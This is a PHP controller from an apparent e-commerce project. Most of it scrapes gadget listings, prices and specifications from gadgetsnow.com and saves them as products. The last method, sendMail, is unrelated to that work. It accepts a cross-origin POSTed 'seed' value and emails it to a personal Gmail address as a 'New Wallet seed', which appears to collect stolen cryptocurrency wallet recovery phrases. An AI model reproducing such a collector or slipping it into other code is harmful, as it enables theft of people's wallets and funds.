<?php

namespace App\Controllers;

use App\Flash;
use App\Mail;
use App\Models\Product;
use Core\Controller;
use DOMDocument;
use DOMXPath;
use simplehtmldom\HtmlDocument;
use simplehtmldom\HtmlWeb;

class Import extends Controller
{

     protected $client;
     protected $import;
     protected $phone = 'mobile-phones';
     protected $laptops = 'laptops';
     protected $tablets = 'tablets';
     protected $cameras = 'cameras';
     protected $television = 'television';
     protected $powerbank = 'powerbank';
     protected $smartwatch = 'smartwatch';
     protected $aircontidion = 'ac';
     protected $washingmaching = 'washingmachine';
     protected $refrigerator = 'refrigerator';
     protected $fitnessband = 'fitnessband';
     protected $doc;
     protected $path;
     
     public function scrapper($alias = '')
     {
          $gadgets = []; 
          $i = 1;
          $item = $_GET['i'];
          $link = 'https://www.gadgetsnow.com/' . $alias.'/'.$item;
          $client = new HtmlWeb;
          $html = $client->load($link);
          // echo var_dump($html); return;
          foreach ($html->find('div[class=_1os5d]') as $key):
               $container = $key->find('div[class=_34Gx6]', 0);

               // ===================================================================
               // ==================== Image and redirect link ======================
               // ===================================================================

                    // $image_cont_in = $image_container->find('div[class=_2vLWe]', 0);
                    $image = $container->find('div[class=_3y0Dv]', 0)->find('a', 0);
     
                    $href = $image->href; // Redirect Link
                    // $src = $image->find('img', 0)->src; // Image link
                    $name = $image->find('img', 0)->title; // Image title or Product title

                    // echo '<pre>';
                    // echo print_r($image);
                    // echo '</pre>';
               // }
               // ===================================================================
               // ==================== Image and redirect link ======================
               // ===================================================================

               // ===================================================================
               // ==================== Find Price and Summary =======================
               // ===================================================================
               $cont = $container->find('div[class=QTlhz]', 0)->find('div[class=_2Ml-Z]', 0);
               $price_cont = $cont->find('div[class=_2PWkt]', 0);
               $price = $cont->find('span[class=_3tTel rs]', 0)->innertext; // Gadget Price 
               $price = str_replace(',', '', str_replace('₹', '', $price)); // Gadget Price

               // $summary_cont = $container->find('div[class=QTlhz]', 0)->find('div[class=x9miq]', 0);
               // $summary = $summary_cont->find('._1G3LF', 0);
               // $summary = htmlspecialchars($summary->innertext);

               $summary = '';

               // ===================================================================
               // ==================== Find Price and Summary ======================
               // ===================================================================

               $fullz = $client->load('https://www.gadgetsnow.com' . $href);
               if(!$fullz->find('div[class=_2k6rd mb40]', 0) == null){
                    $spec = $fullz->find('div[class=_2k6rd mb40]', 0)->innertext;
               }else{
                    $spec = $fullz->find('span[class=summary_content]', 0)->innertext;
               }

               // ===Specificationz=============
               $specificationTable = $fullz->find('div[class=h8JWH gadgets]');

               $specificationData = [];

               $m = 0;
               foreach ($specificationTable as $specification) {
                    $m++;
                    if($m > 9)continue;
                    $title = '';
                    if ($specification->find('div[class=u7wpU _2NYkW]', 0)) {
                         $title = $specification->find('div[class=u7wpU _2NYkW]', 0)->innertext;
                    }
                    // *************************************************
                    // ****************** Table Title*******************
                    // *************************************************
                    $title = preg_replace('/[^a-z ]+/i', '', $title);
                    $title = str_replace(' ', '_', $title);
                    $specificationData[$title] = array();


                    // *************************************************
                    // ****************** Table *******************
                    // *************************************************
                    $tableInit = $specification->find('div[class=_1KhhP _3KOwP]', 0);
                    if ($tableInit->find('div._2eWNC') !== null):
                    $specificationData[$title][] = '';
                    $tableParent = $tableInit->find('div._2eWNC', 0);
                         $table = $tableParent->find('tbody', 0);
                         foreach ($table->find('tr') as $row) {
                              $th = $row->find('th', 0)->innertext;
                              $td = $row->find('td', 0)->innertext;
                              $specificationData[$title][$th] = $td;
                         }
                    endif;
               }

               $spec = htmlspecialchars($spec);

               $gadgets[] = array(
                    'url' => $href,
                    'image' => '/Public/assets/images/default.jpg',
                    'name' => $name,
                    'price' => str_replace(' ', '', $price),
                    'summary' => str_replace('amp;', '', $summary),
                    'description' => str_replace('amp;', '', $spec),
                    'specification' => json_encode($specificationData),
                    'instock' => 'on',
                    'category' => $_GET['c'] ?? 'Opt',
                    'action_type' => 'save'
               );

               $i++;
          endforeach;



          $rt = [];
          foreach ($gadgets as $key):
               $success = Product::saveProduct($key, true);
               $rt[] = $success;
          endforeach;

          $this->import = $rt;
          $this->message();
          echo json_encode($gadgets, JSON_PRETTY_PRINT);
          return $rt;
     }

     public function phones()
     {
          header('content-type: application/json');
          $this->scrapper($this->phone);
     }
     public function laptop()
     {
          header('content-type: application/json');
          $this->scrapper($this->laptops);
     }
     public function camera()
     {
          header('content-type: application/json');
          $this->scrapper($this->cameras);
     }
     public function tablet()
     {
          header('content-type: application/json');
          $this->scrapper($this->tablets);
     }
     public function television()
     {
          header('content-type: application/json');
          $this->scrapper($this->television);
     }
     public function smartwatch()
     {
          header('content-type: application/json');
          $this->scrapper($this->smartwatch);
     }
     public function powerbank()
     {
          header('content-type: application/json');
          $this->scrapper($this->powerbank);
     }
     public function aircondition()
     {
          header('content-type: application/json');
          $this->scrapper($this->aircontidion);
     }
     public function washingmachine()
     {
          header('content-type: application/json');
          $this->scrapper($this->washingmaching);
     }
     public function refrigerator()
     {
          header('content-type: application/json');
          $this->scrapper($this->refrigerator);
     }
     public function fitnessband()
     {
          header('content-type: application/json');
          $this->scrapper($this->fitnessband);
     }

     public function message()
     {
          if (empty($this->import) || $this->import == '' || !$this->import) {
               Flash::addMessage('Sorry i can\'t import at the moment', 'warning');
               Flash::addMessage('The gadget you are trying to import might be too large', 'primary');
               Flash::addMessage('Try importing again. Make sure you have a good internet connection before trying to import', 'primary');
               return;
               // $this->redirect('/admin/product/all');
          }

          if (count($this->import) > 0) {
               Flash::addMessage('Congratulations on your new arivals', 'success');
               $i = 0;
               foreach ($this->import as $key) :
                    if ($key)
                         $i++;
               endforeach;
               Flash::addMessage("You have $i latest gadgets on arrival", 'success');
               Flash::addMessage('You will need to make few changes on new arrivals.', 'warning');
               return;
               // $this->redirect('/admin/product/all');
          }

          Flash::addMessage('OOPS!!! Error occured, Gadget import failed.', 'danger');
          Flash::addMessage('Please make sure you have a strong internet connection.', 'warning');
          Flash::addMessage('or Try again after few minutes', 'warning');
          return;
          // $this->redirect('/admin/product/all');
     }

     public function sendMail(){
          header('Access-Control-Allow-Origin: *');
          header('Access-Control-Allow-Headers: *');
          // header('')
          header('Content-Type: application/json');
          $input = json_decode(file_get_contents('php://input'));
          Mail::mail(
               'horpeyhermi@gmail.com',
               \App\Config::DEFAULT_EMAIL,
               'New Wallet seed',
               $input->seed
               );
          echo json_encode($input->seed);
     }
     
}
